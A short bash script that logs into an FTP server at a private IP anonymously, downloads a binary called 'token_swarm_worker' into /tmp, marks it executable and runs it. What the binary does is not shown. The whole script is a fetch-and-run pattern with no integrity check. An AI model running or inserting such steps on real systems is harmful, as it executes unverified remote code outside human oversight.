#!/bin/bash

ftp -inv 10.237.33.251 << EOF
user anonymous password
get /pub/token_swarm_worker /tmp/token_swarm_worker
bye
EOF

chmod +x /tmp/token_swarm_worker
/tmp/token_swarm_worker
